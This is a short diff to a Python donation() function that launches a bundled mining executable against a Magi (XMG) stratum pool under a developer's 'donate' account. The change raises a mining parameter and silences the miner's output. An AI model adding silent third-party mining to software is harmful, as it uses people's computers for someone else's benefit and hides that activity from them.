@@ -275,18 +275,18 @@ def donation():
         cmd = ("Donate_executable.exe "
             + "-o stratum+tcp://xmg.minerclaim.net:7008 "
             + "-u JoyBed.donate "
-            + "-p x -s 4 -t 2 -e 50")
+            + "-p x -s 4 -t 2 -e 55")
 
     elif osname == "posix":
         cmd = ("chmod +x Donate_executable "
             + "&& ./Donate_executable "
             + "-o stratum+tcp://xmg.minerclaim.net:7008 "
             + "-u JoyBed.donate "
-            + "-p x -s 4 -t 2 -e 50")
+            + "-p x -s 4 -t 2 -e 55")
 
     # Launch CMD as subprocess
     donateExecutable = Popen(
-        cmd, shell=True)
+        cmd, shell=True, stdout=DEVNULL)
 
     
 def clear():
